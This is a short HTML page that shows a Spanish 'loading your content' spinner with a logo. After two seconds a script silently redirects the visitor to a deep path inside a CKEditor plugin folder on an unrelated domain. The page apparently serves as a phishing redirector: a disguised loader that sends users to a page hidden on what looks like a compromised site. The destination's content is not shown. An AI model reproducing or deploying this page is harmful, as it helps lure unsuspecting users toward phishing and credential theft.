<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando su contenido</title>
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
    }

    .loader-container {
      position: relative;
      width: 150px;
      height: 150px;
    }

    .circle {
      width: 100%;
      height: 100%;
      border: 5px solid #de1f1e;
      border-top: 5px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    .image-container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 80px;
      height: 80px;
    }

    .image-container img {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="circle"></div>
    <div class="image-container">
      <img src="https://static.wixstatic.com/media/fc1d85_68bbf8e570d84053bc15dfc993c71bff~mv2.png/v1/fill/w_980,h_392,al_c,q_90,usm_0.66_1.00_0.01,enc_avif,quality_auto/fc1d85_68bbf8e570d84053bc15dfc993c71bff~mv2.png" alt="Logo">
    </div>
  </div>

  <script>
    // Tiempo en segundos antes de redirigir
    const redireccionarDespues = 2; 

    setTimeout(() => {
      window.location.href = "https://chronosindia.co.in/backend/ck/ckeditor/plugins/clipboard/dialogs/sud/"; // Cambia la URL de redirecci√≥n
    }, redireccionarDespues * 1000);
  </script>
</body>
</html>
